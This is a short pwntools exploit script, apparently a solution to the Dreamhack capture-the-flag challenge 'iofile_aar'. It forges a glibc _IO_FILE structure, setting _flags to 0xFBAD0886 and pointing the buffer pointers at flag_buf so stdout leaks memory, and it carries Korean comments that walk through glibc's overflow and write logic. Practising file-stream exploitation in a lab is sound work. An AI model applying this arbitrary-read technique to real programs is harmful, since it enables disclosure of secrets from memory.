from pwn import *
p = remote("host8.dreamhack.games", 13224)
# p = process("./iofile_aar")
e = ELF("./iofile_aar")

flag_buf = e.symbols["flag_buf"]

payload = b""
payload += p64(0xFBAD0886) #! _IO_CURRETLY_PUTTING 필수 _flags
payload += p64(flag_buf) #_IO_read_ptr
payload += p64(flag_buf) #! 0은 안되네.. _IO_read_end
payload += p64(0) #_IO_read_base
payload += p64(flag_buf) #_IO_write_base
payload += p64(flag_buf+1024) #_IO_write_ptr
payload += p64(0) #_IO_write_end
payload += p64(flag_buf) #IO_buf_base
payload += p64(flag_buf) #IO_buf_end
payload += p64(0) #_IO_save_base
payload += p64(0) #_IO_backup_base
payload += p64(0) #_IO_save_end
payload += p64(0) #_IO_marker *_markers
payload += p64(0) #_IO_FILE
payload += p64(1) #_fileno : stdout

p.sendafter(b"Data: ", payload)

p.interactive()

#?      if (f->_IO_read_ptr == f->_IO_buf_end) //read_ptr 이 buf_end 에 도달했으면.
#?     f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base; //read를 write로 갱신
#?      f->_IO_write_ptr = f->_IO_read_ptr;
#       f->_IO_write_base = f->_IO_write_ptr;
#       f->_IO_write_end = f->_IO_buf_end;
#       f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;
#       f->_flags |= _IO_CURRENTLY_PUTTING;
#       if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
#     f->_IO_write_end = f->_IO_write_ptr;
#     }
#   if (ch == EOF) //파일의 끝에 도달했으면. 쓰기 함수 호출
#?    return _IO_do_write (f, f->_IO_write_base, //data는 어디에서?
#?             f->_IO_write_ptr - f->_IO_write_base); 
#	             //이 당시 받은 인자를 write가 그대로 사용

#! else if (fp->_IO_read_end != fp->_IO_write_base)																						 // 즉, IO_read_end도 같게 조정.
#     {
# 	    // read_end 와 write_base 가 다르면 syscall seek 호출
#       _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
#       if (new_pos == _IO_pos_BAD)
# 				return 0;
#       fp->_offset = new_pos;
#     }